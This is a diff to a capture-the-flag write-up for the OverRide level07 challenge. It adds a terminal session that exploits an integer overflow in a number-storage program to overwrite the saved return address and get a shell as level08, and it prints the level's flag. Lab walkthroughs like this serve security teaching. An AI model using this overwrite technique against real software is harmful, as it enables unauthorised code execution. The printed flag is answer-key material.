@@ -121,6 +121,34 @@ When we want to write to index 114, we get blocked by this code :
 If we overflow the UINT_MAX : 4294967295 + 456
 then in int it will be divided by 4 : 1073741938
 
-We have all our elements to change eip address.
+We have all our elements to change eip address :
+
+```
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: exit
+ Failed to do exit command
+Input command: quit
+$ whoami
+level08
+```
 
 flag = `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
